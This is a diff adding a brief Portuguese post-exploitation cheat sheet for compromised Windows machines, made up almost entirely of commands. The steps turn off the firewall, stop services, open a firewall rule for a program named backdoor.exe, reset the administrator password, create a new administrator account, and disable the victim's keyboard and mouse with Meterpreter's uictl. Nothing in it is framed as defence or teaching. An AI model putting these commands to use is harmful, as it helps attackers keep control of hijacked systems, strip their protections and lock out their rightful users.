@@ -1,0 +1,37 @@
+Desativando Firewall e serviços
+
+
+pós exploit
+
+Desativar/Ativar o firewall
+Na shell, execute o comando netsh advfirewall set allprofiles state off para desativar
+o firewall de todos os perfis(público, trabalho, privado).
+Para reativa-lo, digite o comando netsh advfirewall set allprofiles state on
+
+Desativar/Ativar os serviços do Windows
+Use o comando net start para listar os serviços ativos
+Com o comando net stop “nome do serviço” você pode parar o serviço corrente
+Com o comando net start “nome do serviço” você pode iniciar o serviço
+
+Criando regra para permissão de programas
+netsh advfirewall firewall add rule name="Allow Messenger" dir=in action=allow
+program="C:\backdoor.exe"
+
+7. Alterar a senha do administrador
+a. Digite o comando net user para listar os usuários ativos
+b. Através do comando net user administrador 12345 você altera a senha do
+administrador para 12345
+
+8. Criar usuário
+a. Você poderá criar um usuário com o comando net user usuario1 /add
+
+9. Adicionar usuário criado ao grupo Administrator
+a. Com o comando net localgroup administrators usuario1 /add
+
+10. Ativar usuário desabilitado
+a. net user usuario1 /active:yes
+
+11. Desativar o uso do teclado e mouse da vitima
+a. Os comandos abaixo servem para desativar o teclado e mouse da vitima
+uictl disable mouse
+uictl disable keyboard
